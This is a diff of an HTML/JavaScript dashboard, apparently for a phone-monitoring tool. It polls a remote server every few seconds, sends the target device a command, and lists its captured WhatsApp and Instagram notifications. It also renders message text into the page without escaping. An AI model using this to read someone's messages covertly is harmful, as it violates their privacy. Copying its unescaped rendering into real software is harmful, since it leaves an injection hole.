@@ -3,129 +3,109 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Notifications - Device Control</title>
+    <title>Live Notifications - Monitor</title>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <style>
         :root {
             --bg-color: #0f0f0f;
-            --glass-bg: rgba(255, 255, 255, 0.1);
-            --glass-border: rgba(255, 255, 255, 0.2);
+            --glass-bg: rgba(255, 255, 255, 0.07);
+            --glass-border: rgba(255, 255, 255, 0.15);
             --text-main: #ffffff;
             --text-muted: #aaaaaa;
-            --accent: #4caf50;
+            --accent: #00f3ff; /* Neon Blue like Parent GUI */
             --whatsapp: #25D366;
             --instagram: #E1306C;
-            --facebook: #1877F2;
         }
 
         body {
             background-color: var(--bg-color);
-            background-image: linear-gradient(45deg, #000000, #1a1a1a);
+            background-image: radial-gradient(circle at top right, #1a1a1a, #000000);
             color: var(--text-main);
             font-family: 'Segoe UI', sans-serif;
-            margin: 0; padding: 10px;
+            margin: 0; padding: 15px;
             display: flex; justify-content: center;
-            height: 100vh; 
-            overflow: hidden; 
+            height: 100vh; overflow: hidden;
         }
 
-        /* --- Main Container --- */
         .container {
             width: 100%; max-width: 450px;
-            background: rgba(0, 0, 0, 0.5);
+            background: rgba(15, 15, 15, 0.8);
+            backdrop-filter: blur(20px);
             border-radius: 30px; padding: 20px;
             border: 1px solid var(--glass-border);
-            height: 90vh; 
-            display: flex;
-            flex-direction: column;
+            height: 92vh; display: flex; flex-direction: column;
+            box-shadow: 0 20px 50px rgba(0,0,0,0.5);
         }
 
+        /* --- Header --- */
         .header {
             display: flex; justify-content: space-between; align-items: center;
-            margin-bottom: 10px; padding-bottom: 10px;
-            border-bottom: 1px solid var(--glass-border);
-            flex-shrink: 0;
+            margin-bottom: 15px; flex-shrink: 0;
         }
-
-        /* Status Bar Fix */
-        #apiStatus {
-            background: rgba(0, 243, 255, 0.05);
-            font-size: 11px; padding: 8px; border-radius: 12px;
-            margin-bottom: 10px; border-left: 3px solid #00f3ff;
-            color: #00f3ff; font-family: monospace;
-            flex-shrink: 0;
-        }
-
         .back-btn {
-            color: var(--text-main); font-size: 1.2rem;
-            text-decoration: none; display: flex; align-items: center; justify-content: center;
-            width: 35px; height: 35px; background: var(--glass-bg); border-radius: 50%;
-        }
-
-        .page-title { font-weight: bold; font-size: 1.1rem; }
-
-        .refresh-btn {
-            background: var(--glass-bg); border: 1px solid var(--glass-border); color: white;
-            width: 35px; height: 35px; border-radius: 50%; cursor: pointer;
+            color: white; text-decoration: none; width: 40px; height: 40px;
+            background: var(--glass-bg); border-radius: 50%;
             display: flex; align-items: center; justify-content: center;
+            border: 1px solid var(--glass-border);
+        }
+        .title-group { text-align: center; }
+        .title-group h2 { margin: 0; font-size: 1.1rem; letter-spacing: 1px; }
+        .live-indicator { font-size: 0.65rem; color: var(--accent); font-weight: bold; text-transform: uppercase; }
+        .live-dot { height: 6px; width: 6px; background: var(--accent); border-radius: 50%; display: inline-block; margin-right: 5px; animation: blink 1s infinite; }
+
+        @keyframes blink { 0% { opacity: 1; } 50% { opacity: 0.3; } 100% { opacity: 1; } }
+
+        /* --- Sync Status Bar --- */
+        #syncStatus {
+            font-size: 0.7rem; background: rgba(0, 243, 255, 0.1);
+            color: var(--accent); padding: 5px 15px; border-radius: 10px;
+            margin-bottom: 15px; text-align: center; border: 1px solid rgba(0, 243, 255, 0.2);
         }
 
         /* --- Filters --- */
         .filters {
-            display: flex; gap: 8px; overflow-x: auto; 
-            padding-bottom: 10px; margin-bottom: 10px;
+            display: flex; gap: 8px; overflow-x: auto; padding-bottom: 12px; margin-bottom: 5px;
             scrollbar-width: none; flex-shrink: 0;
         }
         .filters::-webkit-scrollbar { display: none; }
-
         .filter-chip {
             background: var(--glass-bg); border: 1px solid var(--glass-border);
-            padding: 6px 12px; border-radius: 20px; font-size: 0.8rem; color: #ccc;
+            padding: 8px 16px; border-radius: 20px; font-size: 0.75rem; color: #ccc;
             white-space: nowrap; cursor: pointer; transition: 0.3s;
         }
-        .filter-chip.active {
-            background: var(--accent); color: white; border-color: var(--accent); font-weight: bold;
-        }
+        .filter-chip.active { background: var(--accent); color: #000; border-color: var(--accent); font-weight: bold; }
 
-        /* --- List --- */
+        /* --- Notification List --- */
         .notif-list {
-            display: flex; flex-direction: column; gap: 10px;
-            overflow-y: auto; 
-            padding-right: 5px;
-            flex-grow: 1; 
+            flex-grow: 1; overflow-y: auto; display: flex; flex-direction: column; gap: 12px;
+            padding-right: 5px; margin-top: 10px;
         }
+        .notif-list::-webkit-scrollbar { width: 3px; }
+        .notif-list::-webkit-scrollbar-thumb { background: var(--glass-border); border-radius: 10px; }
 
-        .notif-list::-webkit-scrollbar { width: 4px; }
-        .notif-list::-webkit-scrollbar-thumb { background: #444; border-radius: 10px; }
-
-        /* --- Card --- */
+        /* --- Notif Card --- */
         .notif-card {
-            background: var(--glass-bg); padding: 12px;
-            border-radius: 15px; display: flex; align-items: flex-start;
-            border: 1px solid var(--glass-border);
+            background: var(--glass-bg); padding: 15px; border-radius: 20px;
+            border: 1px solid var(--glass-border); display: flex; gap: 12px;
+            transition: 0.3s; animation: slideIn 0.4s ease-out;
         }
+        @keyframes slideIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
 
-        .icon-box {
-            width: 40px; height: 40px;
-            background: #333;
-            border-radius: 12px; display: flex; align-items: center; justify-content: center;
-            font-size: 1.2rem; margin-right: 12px; flex-shrink: 0;
+        .app-icon {
+            width: 45px; height: 45px; border-radius: 14px;
+            display: flex; align-items: center; justify-content: center;
+            font-size: 1.4rem; flex-shrink: 0; background: #222;
         }
+        .whatsapp { color: var(--whatsapp); background: rgba(37, 211, 102, 0.1); border: 1px solid rgba(37, 211, 102, 0.3); }
+        .instagram { color: var(--instagram); background: rgba(225, 48, 108, 0.1); border: 1px solid rgba(225, 48, 108, 0.3); }
+        .system { color: var(--accent); background: rgba(0, 243, 255, 0.1); border: 1px solid rgba(0, 243, 255, 0.3); }
 
-        .whatsapp-icon { background: rgba(37, 211, 102, 0.2); color: var(--whatsapp); border: 1px solid var(--whatsapp); }
-        .insta-icon { background: rgba(225, 48, 108, 0.2); color: var(--instagram); border: 1px solid var(--instagram); }
-        .fb-icon { background: rgba(24, 119, 242, 0.2); color: var(--facebook); border: 1px solid var(--facebook); }
-
-        .content { flex: 1; overflow: hidden; }
-        
-        .row-top { display: flex; justify-content: space-between; margin-bottom: 2px; }
-        .sender { font-size: 0.9rem; font-weight: bold; color: #fff; }
-        .time { font-size: 0.7rem; color: var(--text-muted); }
-        
-        .message { 
-            font-size: 0.85rem; color: #ccc; 
-            white-space: nowrap; overflow: hidden; text-overflow: ellipsis; 
-        }
+        .notif-content { flex: 1; min-width: 0; }
+        .notif-header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 4px; }
+        .app-name { font-size: 0.7rem; color: var(--text-muted); text-transform: uppercase; font-weight: bold; }
+        .notif-time { font-size: 0.65rem; color: var(--text-muted); }
+        .notif-title { font-size: 0.95rem; font-weight: bold; color: #fff; margin-bottom: 2px; display: block; }
+        .notif-msg { font-size: 0.85rem; color: #bbb; line-height: 1.3; overflow: hidden; text-overflow: ellipsis; white-space: nowrap; }
 
     </style>
 </head>
@@ -133,196 +113,151 @@
 
     <div class="container">
         <div class="header">
-            <a href="index.html" class="back-btn"><i class="fa-solid fa-chevron-left"></i></a>
-            <span class="page-title">Notifications</span>
-            <button onclick="handleRefresh()" class="refresh-btn" id="refreshBtn"><i class="fa-solid fa-sync"></i></button>
-        </div>
+            <a href="index.html" class="back-btn"><i class="fa-solid fa-arrow-left"></i></a>
+            <div class="title-group">
+                <h2>NOTIFICATIONS</h2>
+                <div class="live-indicator"><span class="live-dot"></span>Live Monitoring</div>
+            </div>
+            <div style="width: 40px;"></div> </div>
 
-        <div id="apiStatus">System Ready</div>
+        <div id="syncStatus">Initializing secure link...</div>
 
         <div class="filters">
-            <div class="filter-chip active" onclick="filterList('all', this)">All</div>
-            <div class="filter-chip" onclick="filterList('whatsapp', this)">WhatsApp</div>
-            <div class="filter-chip" onclick="filterList('instagram', this)">Instagram</div>
-            <div class="filter-chip" onclick="filterList('facebook', this)">Facebook</div>
-            <div class="filter-chip" onclick="filterList('others', this)">Others</div>
+            <div class="filter-chip active" onclick="setFilter('all', this)">All</div>
+            <div class="filter-chip" onclick="setFilter('whatsapp', this)">WhatsApp</div>
+            <div class="filter-chip" onclick="setFilter('instagram', this)">Instagram</div>
+            <div class="filter-chip" onclick="setFilter('others', this)">System</div>
         </div>
 
         <div class="notif-list" id="notifContainer">
-            <div style="text-align: center; color: #666; margin-top: 50px;">Loading data...</div>
-        </div>
+            </div>
     </div>
 
     <script>
         const SERVER_URL = "https://child-v9no.onrender.com";
-        const urlParams = new URLSearchParams(window.location.search);
-        const DEVICE_ID = urlParams.get('id');
+        const params = new URLSearchParams(window.location.search);
+        const DEVICE_ID = params.get('id');
         
-        const storageKey = `notifs_${DEVICE_ID}`;
-        const statusEl = document.getElementById("apiStatus");
-        let allData = [];
+        let allNotifs = [];
+        let currentFilter = 'all';
 
-        // --- INIT ---
-        document.addEventListener("DOMContentLoaded", () => {
-            if (!DEVICE_ID) {
-                setStatus("Error: Device ID missing!", true);
+        // --- 1. Startup ---
+        window.onload = () => {
+            if(!DEVICE_ID) {
+                document.getElementById('syncStatus').innerText = "ERROR: No Device ID";
                 return;
             }
-            setStatus(`Connected: ${DEVICE_ID}`);
             
-            // 1. Load Local
-            loadFromStorage();
-            
-            // 2. Refresh
-            handleRefresh();
-        });
+            // Load cached data first
+            const cached = localStorage.getItem(`cache_notif_${DEVICE_ID}`);
+            if(cached) {
+                allNotifs = JSON.parse(cached);
+                renderNotifs();
+            }
 
-        // --- FUNCTIONS ---
+            // Start Auto-Sync (Har 5 second mein)
+            syncLoop();
+            setInterval(syncLoop, 5000); 
+        };
 
-        function setStatus(msg, isError = false) {
-            statusEl.style.color = isError ? "#ff4444" : "#00f3ff";
-            statusEl.innerHTML = `📡 ${msg}`;
-        }
+        // --- 2. Logic: Server se Data lena (Live Update) ---
+        async function syncLoop() {
+            try {
+                const statusBox = document.getElementById('syncStatus');
+                
+                // Pehle Phone ko Command bhejo (Ki naya data upload kare)
+                fetch(`${SERVER_URL}/api/send-command`, {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({ device_id: DEVICE_ID, command: 'notifications' })
+                });
 
-        function loadFromStorage() {
-            const saved = localStorage.getItem(storageKey);
-            if (saved) {
-                allData = JSON.parse(saved);
-                renderList(allData);
+                // Phir Server se saved file read karo
+                const res = await fetch(`${SERVER_URL}/api/get-data/${DEVICE_ID}/notifications?t=${Date.now()}`);
+                const data = await res.json();
+
+                if (data && Array.isArray(data) && data.length > 0) {
+                    // Agar naya data aaya hai
+                    if (JSON.stringify(data) !== JSON.stringify(allNotifs)) {
+                        allNotifs = data;
+                        localStorage.setItem(`cache_notif_${DEVICE_ID}`, JSON.stringify(data));
+                        renderNotifs();
+                        statusBox.innerText = `Last Sync: ${new Date().toLocaleTimeString()}`;
+                    }
+                } else {
+                    statusBox.innerText = "Syncing... Waiting for phone response";
+                }
+            } catch (e) {
+                console.log("Sync Error");
             }
         }
 
-        function handleRefresh() {
-            const btn = document.getElementById("refreshBtn");
-            btn.querySelector('i').classList.add('fa-spin');
-            
-            // Send Command
-            sendCommand();
-
-            // Fetch Data (Wait 3s)
-            setStatus("Requesting data...");
-            setTimeout(fetchData, 3000); 
-        }
-
-        function sendCommand() {
-            fetch(`${SERVER_URL}/api/send-command`, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ device_id: DEVICE_ID, command: 'notifications' })
-            }).then(res => res.json())
-              .then(d => console.log("Command Sent"))
-              .catch(e => console.error("Command Error"));
-        }
-
-        function fetchData() {
-            const btn = document.getElementById("refreshBtn");
-            const API_URL = `${SERVER_URL}/api/get-data/${DEVICE_ID}/notifications?t=${Date.now()}`;
-
-            fetch(API_URL)
-                .then(res => res.json())
-                .then(data => {
-                    btn.querySelector('i').classList.remove('fa-spin');
-                    
-                    if (!data || data.length === 0) {
-                        setStatus("No new data.");
-                        if(allData.length === 0) {
-                            document.getElementById("notifContainer").innerHTML = 
-                                "<div style='text-align: center; color: #666; margin-top: 20px;'>No notifications yet.</div>";
-                        }
-                        return;
-                    }
-
-                    setStatus(`Updated: ${data.length} items`);
-                    allData = data;
-                    localStorage.setItem(storageKey, JSON.stringify(data));
-                    
-                    // Render based on current filter
-                    const activeFilter = document.querySelector('.filter-chip.active');
-                    filterList(activeFilter ? activeFilter.innerText.toLowerCase() : 'all', activeFilter);
-                })
-                .catch(err => {
-                    btn.querySelector('i').classList.remove('fa-spin');
-                    setStatus("Error connecting", true);
-                });
-        }
-
-        function renderList(data) {
-            const container = document.getElementById("notifContainer");
+        // --- 3. UI: List Render karna ---
+        function renderNotifs() {
+            const container = document.getElementById('notifContainer');
             container.innerHTML = "";
 
-            if (!data || data.length === 0) {
-                container.innerHTML = "<div style='text-align: center; color: #666; margin-top: 20px;'>No data found.</div>";
+            let filtered = allNotifs;
+            if (currentFilter !== 'all') {
+                filtered = allNotifs.filter(n => {
+                    const app = (n.appName || "").toLowerCase();
+                    if(currentFilter === 'others') {
+                        return !app.includes('whatsapp') && !app.includes('instagram');
+                    }
+                    return app.includes(currentFilter);
+                });
+            }
+
+            if(filtered.length === 0) {
+                container.innerHTML = `<div style="text-align:center; padding-top:50px; color:#555;">No notifications found</div>`;
                 return;
             }
 
-            // Reverse for newest first
-            data.slice().reverse().forEach(item => {
-                const appName = (item.appName || "System").toLowerCase();
-                const title = item.title || "Unknown";
-                const text = item.text || "Notification";
+            // Render list (Latest first)
+            filtered.forEach(item => {
+                const app = (item.appName || "System").toLowerCase();
+                const time = item.postTime ? formatTime(item.postTime) : "Just now";
                 
-                let iconClass = '';
-                let iconHtml = '<i class="fa-solid fa-bell"></i>';
+                let iconClass = "system";
+                let iconImg = '<i class="fa-solid fa-ghost"></i>';
 
-                if (appName.includes("whatsapp")) {
-                    iconClass = 'whatsapp-icon';
-                    iconHtml = '<i class="fa-brands fa-whatsapp"></i>';
-                } else if (appName.includes("instagram")) {
-                    iconClass = 'insta-icon';
-                    iconHtml = '<i class="fa-brands fa-instagram"></i>';
-                } else if (appName.includes("facebook")) {
-                    iconClass = 'fb-icon';
-                    iconHtml = '<i class="fa-brands fa-facebook-f"></i>';
+                if(app.includes('whatsapp')) {
+                    iconClass = "whatsapp";
+                    iconImg = '<i class="fa-brands fa-whatsapp"></i>';
+                } else if(app.includes('instagram')) {
+                    iconClass = "instagram";
+                    iconImg = '<i class="fa-brands fa-instagram"></i>';
                 }
 
-                let timeDisplay = "";
-                if (item.postTime) {
-                    let d = new Date(parseInt(item.postTime));
-                    if(!isNaN(d.getTime())) {
-                        timeDisplay = `${d.getHours()}:${d.getMinutes().toString().padStart(2, '0')}`;
-                    }
-                }
-
-                container.innerHTML += `
+                const card = `
                     <div class="notif-card">
-                        <div class="icon-box ${iconClass}">
-                            ${iconHtml}
-                        </div>
-                        <div class="content">
-                            <div class="row-top">
-                                <span class="sender">${title}</span>
-                                <span class="time">${timeDisplay}</span>
+                        <div class="app-icon ${iconClass}">${iconImg}</div>
+                        <div class="notif-content">
+                            <div class="notif-header">
+                                <span class="app-name">${item.appName || 'System'}</span>
+                                <span class="notif-time">${time}</span>
                             </div>
-                            <div class="message">${text}</div>
+                            <b class="notif-title">${item.title || 'Notification'}</b>
+                            <div class="notif-msg">${item.text || 'No content'}</div>
                         </div>
-                    </div>`;
+                    </div>
+                `;
+                container.innerHTML += card;
             });
         }
 
-        function filterList(type, element) {
-            if(element) {
-                document.querySelectorAll('.filter-chip').forEach(btn => btn.classList.remove('active'));
-                element.classList.add('active');
-            }
+        function setFilter(type, el) {
+            currentFilter = type;
+            document.querySelectorAll('.filter-chip').forEach(c => c.classList.remove('active'));
+            el.classList.add('active');
+            renderNotifs();
+        }
 
-            // Fix filter naming mismatch
-            let key = type.toLowerCase();
-            if(key === 'others') key = 'others'; // Just to be safe
-            
-            if (key === 'all') {
-                renderList(allData);
-            } else if (key === 'others') {
-                const filtered = allData.filter(item => {
-                    const app = (item.appName || "").toLowerCase();
-                    return !app.includes('whatsapp') && !app.includes('instagram') && !app.includes('facebook');
-                });
-                renderList(filtered);
-            } else {
-                const filtered = allData.filter(item => 
-                    (item.appName || "").toLowerCase().includes(key)
-                );
-                renderList(filtered);
-            }
+        function formatTime(timestamp) {
+            try {
+                const date = new Date(parseInt(timestamp));
+                return date.toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' });
+            } catch(e) { return "Live"; }
         }
     </script>
 </body>
